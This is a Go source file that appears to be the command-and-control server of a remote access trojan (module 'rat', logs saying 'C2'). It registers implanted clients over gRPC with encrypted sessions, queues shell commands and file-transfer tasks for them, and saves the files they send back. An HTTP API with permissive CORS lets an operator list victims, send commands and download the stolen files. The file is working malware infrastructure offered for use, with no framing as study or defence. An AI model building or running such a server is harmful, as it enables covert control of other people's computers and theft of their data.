package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"rat/internal/crypto"
	pb "rat/internal/proto"

	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/protobuf/proto"
)

type ClientSession struct {
	SessionKey  []byte
	Hostname    string
	OS          string
	LastSeen    time.Time
	TaskQueue   chan *pb.Task
	FileBuffers map[string]*bytes.Buffer
}

var (
	clients = make(map[string]*ClientSession)
	mu      sync.RWMutex
	cmdLogs []string
	logsMu  sync.Mutex
)

type server struct {
	pb.UnimplementedClientServiceServer
}

func (s *server) Register(cntx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponce, error) {
	privKey, pubKey, err := crypto.GenKeyPair()
	if err != nil {
		return nil, err
	}
	sharedKey, err := crypto.GetAESKey(privKey, req.PublicKey)
	if err != nil {
		log.Printf("[!!!] Key exchange failed for %s", req.ClientId)
		return nil, err
	}

	mu.Lock()
	clients[req.ClientId] = &ClientSession{
		SessionKey:  sharedKey,
		Hostname:    req.Hostname,
		OS:          req.Os,
		LastSeen:    time.Now().Local(),
		TaskQueue:   make(chan *pb.Task, 50),
		FileBuffers: make(map[string]*bytes.Buffer),
	}
	mu.Unlock()
	log.Printf("Client registered: %s (%s)", req.Hostname, req.ClientId)
	return &pb.RegisterResponce{PublicKey: pubKey}, nil
}

func (s *server) GetTask(cntx context.Context, req *pb.PollRequest) (*pb.TaskEnvelope, error) {
	mu.RLock()
	session, ok := clients[req.ClientId]
	mu.RUnlock()
	if !ok {
		return &pb.TaskEnvelope{}, nil
	}
	mu.Lock()
	session.LastSeen = time.Now().Local()
	mu.Unlock()
	select {
	case task := <-session.TaskQueue:
		data, err := proto.Marshal(task)
		if err != nil {
			log.Printf("[!!!] Marshal error: %v", err)
			return nil, err
		}
		enc, initV, err := crypto.Encrypt(data, session.SessionKey)
		if err != nil {
			return nil, err
		}
		log.Printf("Send task %s to %s", task.Type, req.ClientId)
		return &pb.TaskEnvelope{EncryptedData: enc, InitV: initV}, nil
	case <-time.After(time.Second):
		return &pb.TaskEnvelope{}, nil
	}
}

func (s *server) SendResult(stream pb.ClientService_SendResultServer) error {
	for {
		envelope, err := stream.Recv()
		if err == io.EOF {
			return stream.SendAndClose(&pb.Empty{})
		}
		if err != nil {
			return err
		}
		mu.RLock()
		session, ok := clients[envelope.ClientId]
		mu.RUnlock()
		if !ok {
			continue
		}
		data, err := crypto.Decrypt(envelope.EncryptedData, envelope.InitV, session.SessionKey)
		if err != nil {
			log.Printf("[!!!] Decrypt error from %s", envelope.ClientId)
			continue
		}
		var res pb.TaskResult
		if err := proto.Unmarshal(data, &res); err != nil {
			continue
		}
		if res.FileName != "" {
			handleFileChunk(session, &res)
		} else {
			log.Printf("Result from %s:\n %s", envelope.ClientId, res.Output)
			if res.Error != "" {
				log.Printf("Error from %s:\n %s", envelope.ClientId, res.Error)
			}
			logsAppend(res.Command, res.TaskId, res.Output, res.Error)
		}
	}
}

func logsAppend(command, taskId, output, cmdError string) {
	logsMu.Lock()
	defer logsMu.Unlock()
	timestamp := time.Now().UTC().Add(3 * time.Hour).Format("02-01-2006 15:04:05")
	entry := fmt.Sprintf("[%s] %s (%s)\n", timestamp, command, taskId)
	if output != "" {
		entry += "\n" + output
	}
	if cmdError != "" {
		entry += "\nError: " + cmdError
	}
	cmdLogs = append(cmdLogs, entry)
}

func handleFileChunk(session *ClientSession, res *pb.TaskResult) {
	mu.Lock()
	defer mu.Unlock()
	if _, exists := session.FileBuffers[res.TaskId]; !exists {
		session.FileBuffers[res.TaskId] = new(bytes.Buffer)
	}
	session.FileBuffers[res.TaskId].Write(res.FileChunk)
	if res.IsLast {
		finalData := session.FileBuffers[res.TaskId].Bytes()
		os.MkdirAll("uploads", 0755)
		savePath := filepath.Join("uploads", filepath.Base(res.FileName))
		os.WriteFile(savePath, finalData, 0644)
		log.Printf("File %s saved", savePath)
		logsAppend("Download "+res.FileName, res.TaskId, "saved", "")
		delete(session.FileBuffers, res.TaskId)
	}
}

func apiClients(w http.ResponseWriter, r *http.Request) {
	mu.RLock()
	defer mu.RUnlock()
	list := []interface{}{}
	now := time.Now()

	for id, s := range clients {
		if now.Sub(s.LastSeen) < 30*time.Second {
			list = append(list, map[string]interface{}{
				"id":        id,
				"hostname":  s.Hostname,
				"os":        s.OS,
				"last_seen": s.LastSeen,
			})
		}
	}
	json.NewEncoder(w).Encode(list)
}

func apiTask(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	var req struct {
		Type     string `json:"type"`
		Cmd      string `json:"command"`
		Path     string `json:"path"`
		FileName string `json:"file_name"`
		FileData []byte `json:"file_data"`
	}
	json.NewDecoder(r.Body).Decode(&req)
	mu.RLock()
	session, ok := clients[id]
	mu.RUnlock()
	if !ok {
		http.Error(w, "offline", 404)
		return
	}
	task := &pb.Task{
		TaskId:   uuid.New().String(),
		Type:     req.Type,
		Command:  req.Cmd,
		FilePath: req.Path,
		FileName: req.FileName,
		FileData: req.FileData,
	}
	session.TaskQueue <- task
	json.NewEncoder(w).Encode(map[string]string{"status": "queued", "task_id": task.TaskId})
}

func apiListUploads(w http.ResponseWriter, r *http.Request) {
	files, err := os.ReadDir("uploads")
	if err != nil {
		json.NewEncoder(w).Encode([]string{})
		return
	}
	var list []string
	for _, f := range files {
		if !f.IsDir() {
			list = append(list, f.Name())
		}
	}
	json.NewEncoder(w).Encode(list)
}

func apiGetLogs(w http.ResponseWriter, r *http.Request) {
	logsMu.Lock()
	defer logsMu.Unlock()
	json.NewEncoder(w).Encode(cmdLogs)
}

func cleanupInactiveClients() {
	mu.Lock()
	defer mu.Unlock()
	now := time.Now()
	for id, session := range clients {
		if now.Sub(session.LastSeen) > 2*time.Minute {
			log.Printf("Removing inactive client: %s (%s)", session.Hostname, id)
			close(session.TaskQueue)
			delete(clients, id)
		}
	}
}

func main() {
	// grpc
	go func() {
		listen, _ := net.Listen("tcp", ":50051")
		s := grpc.NewServer()
		pb.RegisterClientServiceServer(s, &server{})
		log.Println("C2 gRPC on :50051")
		s.Serve(listen)
	}()

	go func() {
		ticker := time.NewTicker(time.Minute)
		for range ticker.C {
			cleanupInactiveClients()
		}
	}()

	corsHandler := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Access-Control-Allow-Origin", "*")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
			if r.Method == "OPTIONS" {
				w.WriteHeader(http.StatusOK)
				return
			}
			next(w, r)
		}
	}

	// http
	http.HandleFunc("/api/uploads", corsHandler(apiListUploads))
	http.Handle("/download/", http.StripPrefix("/download/", http.FileServer(http.Dir("uploads"))))
	http.HandleFunc("/api/clients", corsHandler(apiClients))
	http.HandleFunc("/api/task", corsHandler(apiTask))
	http.HandleFunc("/api/logs", corsHandler(apiGetLogs))
	log.Println("C2 API on :8081")
	http.ListenAndServe(":8081", nil)
}
